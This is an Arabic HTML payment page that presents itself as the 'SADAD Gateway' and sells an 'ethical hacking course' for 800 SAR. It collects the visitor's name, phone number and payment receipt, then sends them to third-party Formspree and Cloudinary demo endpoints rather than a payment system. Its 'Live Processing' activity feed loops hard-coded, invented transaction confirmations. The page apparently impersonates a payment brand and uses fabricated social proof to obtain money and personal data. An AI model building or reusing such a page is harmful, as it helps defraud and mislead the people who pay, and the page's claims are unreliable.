<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة الدفع الآمن | SADAD Gateway</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap');
        
        body { 
            font-family: 'Tajawal', sans-serif; 
            background-color: #020617; 
            color: white;
            background-image: radial-gradient(circle at 50% -20%, #172554 0%, #020617 85%);
            min-height: 100vh;
        }

        .premium-card {
            background: rgba(15, 23, 42, 0.6);
            backdrop-filter: blur(25px);
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 2rem;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }

        .sadad-header {
            background: linear-gradient(90deg, #1d4ed8, #2563eb);
            padding: 10px 30px;
            border-radius: 0 0 1.5rem 1.5rem;
            box-shadow: 0 5px 15px rgba(37, 99, 235, 0.3);
            display: inline-block;
        }

        /* سجل النشاط المتحرك */
        .activity-box {
            height: 120px;
            overflow: hidden;
            position: relative;
        }

        .activity-list {
            position: absolute;
            width: 100%;
            animation: scrollUp 20s linear infinite;
        }

        @keyframes scrollUp {
            0% { top: 100%; }
            100% { top: -250%; }
        }

        .activity-item {
            padding: 8px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            font-size: 0.75rem;
            color: #94a3b8;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .status-dot {
            width: 6px; height: 6px;
            background: #22c55e;
            border-radius: 50%;
            box-shadow: 0 0 8px #22c55e;
        }

        .btn-pay {
            background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
            transition: all 0.3s ease;
        }
        .btn-pay:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(37, 99, 235, 0.4); }
    </style>
</head>
<body class="py-10 px-4">

    <div class="max-w-3xl mx-auto">
        
        <div class="text-center mb-10">
            <div class="sadad-header mb-6">
                <span class="text-white font-black tracking-widest text-lg italic">SADAD | سداد</span>
            </div>
            <h1 class="text-3xl font-black text-white">إتمام عملية الاشتراك الآمن</h1>
            <p class="text-slate-400 mt-2">نظام التحقق الآلي من المدفوعات نشط حالياً</p>
        </div>

        <div class="bg-black/30 rounded-2xl p-4 mb-8 border border-white/5 overflow-hidden">
            <div class="flex items-center gap-2 mb-3 border-b border-white/5 pb-2">
                <div class="status-dot"></div>
                <span class="text-[10px] font-bold text-slate-500 uppercase tracking-widest">معالجة فورية | Live Processing</span>
            </div>
            <div class="activity-box">
                <div class="activity-list" id="activityList">
                    </div>
            </div>
        </div>

        <div id="mainForm" class="premium-card overflow-hidden">
            <form id="enrollForm" action="https://formspree.io/f/xkokbjjy" method="POST" class="p-8 md:p-12">
                <input type="hidden" name="نوع_المنتج" id="hiddenItemName">
                <input type="hidden" name="المبلغ_المطلوب" id="hiddenPrice">
                
                <div class="flex flex-col md:flex-row justify-between items-center gap-6 mb-10 bg-blue-500/5 p-6 rounded-3xl border border-blue-500/10">
                    <div class="text-center md:text-right">
                        <p class="text-xs text-blue-400 font-bold mb-1">الخدمة المطلوبة:</p>
                        <h2 id="displayItemName" class="text-xl font-bold text-white">دورة الاختراق الأخلاقي</h2>
                    </div>
                    <div class="text-center md:text-left">
                        <p class="text-xs text-blue-400 font-bold mb-1">إجمالي المبلغ:</p>
                        <div class="text-3xl font-black text-white"><span id="displayPrice">800</span> <span class="text-sm text-slate-500">ر.س</span></div>
                    </div>
                </div>

                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-10">
                    <div>
                        <label class="text-[10px] text-slate-500 font-bold mb-2 block mr-2">اسم المشترك بالكامل</label>
                        <input type="text" name="الاسم" required placeholder="مثال: فهد بن محمد" class="w-full bg-slate-900/50 border border-slate-800 p-4 rounded-xl outline-none focus:border-blue-500 transition text-white">
                    </div>
                    <div>
                        <label class="text-[10px] text-slate-500 font-bold mb-2 block mr-2">رقم الجوال المرتبط</label>
                        <input type="tel" name="الجوال" required placeholder="05xxxxxxxx" class="w-full bg-slate-900/50 border border-slate-800 p-4 rounded-xl outline-none focus:border-blue-500 transition text-white text-right">
                    </div>
                </div>

                <div class="mb-10">
                    <label class="text-center text-[10px] text-blue-400 font-bold mb-3 block uppercase tracking-tighter">حساب سداد الرسمي للمدفوعات</label>
                    <div class="bg-slate-950 p-8 rounded-3xl border border-white/5 flex flex-col items-center relative group">
                        <div class="text-4xl md:text-5xl font-black text-white tracking-[5px] mb-4 font-mono select-all">82492135384</div>
                        <button type="button" onclick="copyNum()" class="text-[10px] bg-blue-600/20 text-blue-400 px-4 py-2 rounded-full border border-blue-500/20 hover:bg-blue-600 hover:text-white transition">نسخ الرقم</button>
                    </div>
                </div>

                <div class="mb-10">
                    <label class="flex flex-col items-center justify-center w-full h-28 border-2 border-dashed border-slate-800 rounded-3xl cursor-pointer hover:bg-white/5 transition">
                        <span class="text-xs text-slate-500">ارفق صورة إيصال السداد (JPG/PNG)</span>
                        <input type="file" id="fileInput" accept="image/*" required class="hidden" />
                    </label>
                    <input type="hidden" name="رابط_الإيصال" id="imageUrl">
                </div>

                <button type="submit" id="submitBtn" class="btn-pay w-full text-white font-black py-5 rounded-2xl text-xl shadow-2xl">تأكيد عملية السداد الآن</button>
            </form>
        </div>

        <div id="successMsg" class="hidden premium-card p-16 text-center">
            <div class="w-20 h-20 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
                <svg class="h-10 w-10 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7" /></svg>
            </div>
            <h2 class="text-3xl font-black mb-4">تمت العملية بنجاح</h2>
            <p class="text-slate-400">نظام سداد يقوم الآن بمراجعة طلبك. سيتم إرسال التفاصيل عبر واتساب.</p>
        </div>
    </div>

    <script>
        // 1. نظام سجل النشاط اللانهائي
        const activityList = document.getElementById('activityList');
        const phrases = [
            "تم التحقق من عملية سداد جديدة بمبلغ 800 ر.س",
            "طلب انضمام جديد قيد المعالجة الآن...",
            "تحديث: تم تفعيل حساب مشترك جديد في دورة الاختراق",
            "نظام سداد: تم استلام إيصال جديد بنجاح",
            "تم تأكيد الهوية الرقمية لمشترك جديد",
            "سجل النظام: عملية دفع مكتملة #49283",
            "جاري ربط حساب المشترك الجديد بالمنصة التعليمية",
            "تمت المصادقة على طلب اشتراك من (الرياض)",
            "تم تحديث حالة الدفع إلى: مكتمل ✅"
        ];

        // تكرار العبارات لعمل اللوب
        for(let i=0; i<30; i++) {
            const item = document.createElement('div');
            item.className = 'activity-item';
            item.innerHTML = `<div class="status-dot"></div> ${phrases[i % phrases.length]}`;
            activityList.appendChild(item);
        }

        // 2. جلب البيانات من الرابط
        function updateParams() {
            const urlParams = new URLSearchParams(window.location.search);
            document.getElementById('displayItemName').innerText = urlParams.get('item') || "دورة الاختراق الأخلاقي";
            document.getElementById('displayPrice').innerText = urlParams.get('price') || "800";
            document.getElementById('hiddenItemName').value = urlParams.get('item');
            document.getElementById('hiddenPrice').value = urlParams.get('price');
        }
        window.onload = updateParams;

        // 3. وظيفة النسخ
        function copyNum() {
            navigator.clipboard.writeText("82492135384");
            alert("تم نسخ رقم سداد");
        }

        // 4. إرسال النموذج
        const form = document.getElementById('enrollForm');
        form.onsubmit = async function(e) {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            btn.disabled = true;
            btn.innerText = "جاري المعالجة الرقمية...";

            try {
                const file = document.getElementById('fileInput').files[0];
                const formData = new FormData();
                formData.append('file', file);
                formData.append('upload_preset', 'ml_default');

                const uploadRes = await fetch('https://api.cloudinary.com/v1_1/demo/image/upload', {
                    method: 'POST', body: formData
                });
                const uploadData = await uploadRes.json();
                document.getElementById('imageUrl').value = uploadData.secure_url;

                await fetch(form.action, {
                    method: 'POST',
                    body: new FormData(form),
                    headers: { 'Accept': 'application/json' }
                });

                document.getElementById('mainForm').style.display = 'none';
                document.getElementById('successMsg').classList.remove('hidden');
                window.scrollTo(0,0);
            } catch (err) {
                alert("يرجى التأكد من رفع الإيصال.");
                btn.disabled = false;
                btn.innerText = "تأكيد عملية السداد الآن";
            }
        };
    </script>
</body>
</html>
